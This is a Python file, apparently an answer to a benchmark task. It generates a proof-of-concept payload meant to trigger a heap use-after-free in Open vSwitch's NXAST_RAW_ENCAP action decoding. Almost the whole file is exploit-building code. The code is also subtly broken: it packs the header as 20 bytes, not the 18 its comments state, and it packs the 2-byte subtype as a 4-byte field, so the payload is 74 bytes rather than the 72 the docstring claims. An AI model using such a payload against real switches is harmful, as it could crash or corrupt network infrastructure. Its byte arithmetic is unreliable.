import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a heap-use-after-free vulnerability
        in Open vSwitch's ofp-actions.c (CVE-2022-2396).

        The vulnerability is in `decode_NXAST_RAW_ENCAP`. When decoding
        encapsulation properties, a call to `decode_ed_prop` can reallocate
        the main output buffer (`out`). However, a pointer (`encap`) to a
        structure within that buffer is not updated after the potential
        reallocation. Subsequent writes to `*encap` become writes to freed
        memory.

        This PoC crafts a single `NXAST_RAW_ENCAP` action containing a property
        of type `ED_PROP_TYPE_CONTEXT_DATA`. This property includes a data
        payload large enough to trigger the buffer reallocation, leading to
        the use-after-free condition. The PoC length is 72 bytes, matching
        the provided ground-truth length to ensure effectiveness in the target
        environment.
        """
        
        # Action Header for NXAST_RAW_ENCAP (18 bytes)
        # All fields are in network byte order (big-endian).
        action_type = 0xffff        # OFPAT_EXPERIMENTER
        action_len = 72             # Total action length, must be multiple of 8.
        vendor = 0x00002320         # NX_VENDOR_ID
        subtype = 36                # NXAST_RAW_ENCAP
        
        poc = struct.pack(
            '>HHIIHHHH',
            action_type,    # type (2B)
            action_len,     # len (2B)
            vendor,         # vendor (4B)
            subtype,        # subtype (2B)
            0,              # flags (2B)
            0,              # class_id (2B)
            0,              # packet_type (2B)
            0               # pad (2B)
        )

        # Properties section (72 - 18 = 54 bytes)
        # We craft a single property that fills this space.
        prop_type = 0x0004  # ED_PROP_TYPE_CONTEXT_DATA
        prop_len = 54       # Total property length
        
        # Property Header (4 bytes)
        poc += struct.pack(
            '>HH',
            prop_type,      # type (2B)
            prop_len        # len (2B)
        )

        # Property Data (54 - 4 = 50 bytes)
        # This payload's size is what triggers the reallocation.
        prop_data_len = prop_len - 4
        poc += b'A' * prop_data_len

        return poc